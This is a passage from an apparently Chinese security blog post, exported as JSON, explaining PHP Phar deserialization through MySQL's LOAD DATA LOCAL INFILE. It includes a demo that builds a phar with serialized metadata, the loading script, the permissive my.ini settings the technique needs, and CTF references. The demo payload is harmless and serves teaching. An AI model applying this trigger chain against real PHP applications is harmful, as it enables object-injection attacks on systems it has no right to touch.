alt=\"在这里插入图片描述\"><br>通过Phar伪协议即可获取到Flag<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205005.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"Phar扩展\"><a href=\"#Phar扩展\" class=\"headerlink\" title=\"Phar扩展\"></a>Phar扩展</h1><h2 id=\"MySQL-Phar-反序列化\"><a href=\"#MySQL-Phar-反序列化\" class=\"headerlink\" title=\"MySQL Phar 反序列化\"></a>MySQL Phar 反序列化</h2><p><code>LOAD DATA LOCAL INFILE</code>会触发<code>php_stream_open_wrapper</code>，当我们将它放置到Phar文件中的时候，也会触发反序列化<br>先来简述一下<code>LOAD DATA LOCAL INFILE</code>，它是通过文件批量向表中插入内容的，常用语句如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">LOAD</span> <span class=\"token constant\">DATA</span> <span class=\"token constant\">LOCAL</span> <span class=\"token constant\">INFILE</span> <span class=\"token string single-quoted-string\">'1.txt'</span> into table user<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>可能语言描述有点抽象，这里用<code>Navicat</code>演示一下其作用<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205033.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205115.png\" alt=\"在这里插入图片描述\"><br>这个是语句的正常用法<br>而当这个文件是经过Phar协议的Phar文件时，此时调用会出现<code>warning，LOAD DATA LOCAL INFILE forbidden</code><br>这个是因为我们需要手动修改一下my.ini下的一些配置，也就是说这个是调用的前提，具体如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">local<span class=\"token operator\">-</span>infile<span class=\"token operator\">=</span><span class=\"token number\">1</span>\nsecure_file_priv<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205207.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"demo-1\"><a href=\"#demo-1\" class=\"headerlink\" title=\"demo\"></a>demo</h3><p>生成Phar文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">#q.php\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">TestObject</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'quan9i.phar'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;?php __HALT_COMPILER(); ? >'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TestObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token property\">data</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>访问q.php后生成quan9i.phar文件，接下来利用语句来调用Phar文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">#1.php\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">TestObject</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">data</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">mysqli_options</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">MYSQLI_OPT_LOCAL_INFILE</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_real_connect</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3306</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'LOAD DATA LOCAL INFILE \\'phar://quan9i.phar/test.txt\\' INTO TABLE test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205307.png\" alt=\"在这里插入图片描述\"><br>可以发现此时不仅写入了，而且也成功触发反序列化了</p>\n<p>这里的话还有相对应的例题，即<code>N1CTF2019 sql_manage</code>，这道题的话Wp和涉及知识点可以参考以下几个文章<br><a href=\"https://github.com/Nu1LCTF/n1ctf-2019/tree/master/WEB/sql_manage\">https://github.com/Nu1LCTF/n1ctf-2019/tree/master/WEB/sql_manage</a><br><a href=\"https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a><br><a href=\"https://xz.aliyun.com/t/6699#toc-1\">https://xz.aliyun.com/t/6699#toc-1</a></p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://paper.seebug.org/680/\">https://paper.seebug.org/680/</a><br><a href=\"https://guokeya.github.io/post/uxwHLckwx/\">https://guokeya.github.io/post/uxwHLckwx/</a><br><a href=\"http://www.gofervor.com/2022/08/04/NSSCTF%20Round4/\">http://www.gofervor.com</a><br><a href=\"https://www.freebuf.com/articles/web/305292.html\">https://www.freebuf.com/articles/web/305292.html</a><br><a href=\"https://pankas.top/2022/08/04/php%28phar%29%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#phar-%E6%96%87%E4%BB%B6%E7%AD%BE%E5%90%8D%E4%BF%AE%E6%94%B9\">https://pankas.top/2022/08/04/php(phar)</a><br><a href=\"https://xz.aliyun.com/t/2715\">https://xz.aliyun.com/t/2715</a><br><a href=\"https://xz.aliyun.com/t/6699#toc-4\">https://xz.aliyun.com/t/6699#toc-4</a><br><a href=\"https://www.freebuf.com/articles/web/291992.html\">https://www.freebuf.com/articles/web/291992.html</a><br><a href=\"https://blog.csdn.net/weixin_39843986/article/details/113306355\">https://blog.csdn.net/weixin_39843986/article/details/113306355</a><br><a href=\"https://www.cnblogs.com/BOHB-yunying/p/11504051.html\">https://www.cnblogs.com/BOHB-yunying/p/11504051.html</a><br><a href=\"https://xz.aliyun.com/t/2958#toc-0\">https://xz.aliyun.com/t/2958#toc-0</a></p>\n","feature":true,"text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1732 前言Phar反序列化是PHP反序列化的一个重要部分，进行相关学习后，简单总结如下，希望对正在学习的师傅有所帮助。 了解PharPhar含义可以认为Phar是PHP的压缩文档，是PHP中类似于J...","link":"","photos":[],"count_time":{"symbolsCount":"16k","symbolsTime":"14 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":4,"path":"api/tags/反序列化.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A3%B0%E6%98%8E\"><span class=\"toc-text\">声明</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%86%E8%A7%A3Phar\"><span class=\"toc-text\">了解Phar</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Phar%E5%90%AB%E4%B9%89\"><span class=\"toc-text\">Phar含义</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Phar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84\"><span class=\"toc-text\">Phar文件结构</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Stub\"><span class=\"toc-text\">Stub</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#manifest\"><span class=\"toc-text\">manifest</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#contents\"><span class=\"toc-text\">contents</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#signature\"><span class=\"toc-text\">signature</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">反序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%88%90%E5%9B%A0\"><span class=\"toc-text\">成因</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#demo\"><span class=\"toc-text\">demo</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%94%9F%E6%88%90Phar%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">生成Phar文件</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1\"><span class=\"toc-text\">反序列化</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6\"><span class=\"toc-text\">条件</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">绕过方式</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9B%B4%E6%94%B9%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F\"><span class=\"toc-text\">更改文件格式</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87Phar%E5%85%B3%E9%94%AE%E5%AD%97%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">绕过Phar关键字检测</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87-HALT-COMPILER%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">绕过__HALT_COMPILER检测</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox\"><span class=\"toc-text\">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#NSSRound-4-SWPU-1zweb\"><span class=\"toc-text\">[NSSRound#4 SWPU]1zweb</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Phar%E6%89%A9%E5%B1%95\"><span class=\"toc-text\">Phar扩展</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MySQL-Phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">MySQL Phar 反序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#demo-1\"><span class=\"toc-text\">demo</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><span class=\"toc-text\">参考文献</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Python 反序列化浅析","uid":"7c4cd24912c14890fdfeed8e71bda8c9","slug":"Python 反序列化浅析","date":"2022-10-14T18:04:30.000Z","updated":"2023-03-14T07:32:04.000Z","comments":true,"path":"api/articles/Python 反序列化浅析.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141531600.png","text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1782/ 前言之前所接触的大多是PHP 反序列化题型，最近遇见了一道Python pickle反序列化类型题，因此学习了一下其反序列化，简单总结如下，希望能对各位师傅有所帮助。 Pickle师傅们可自...","link":"","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"Python","slug":"Python","count":1,"path":"api/categories/Python.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":4,"path":"api/tags/反序列化.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"浅析XML外部实体注入","uid":"ba5cd70ce8afc153bbd78450a1b070ab","slug":"浅析XML实体注入","date":"2022-09-02T02:11:20.000Z","updated":"2023-03-14T07:25:50.000Z","comments":true,"path":"api/articles/浅析XML实体注入.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141525658.png","text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1716/ 前言在进行系统学习过后，对XXE进行简单总结，希望能对正在学习XXE的师傅有所帮助 前置知识XML什么是XMLXML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，...","link":"","photos":[],"count_time":{"symbolsCount":"15k","symbolsTime":"14 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"XML","slug":"XML","count":1,"path":"api/tags/XML.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}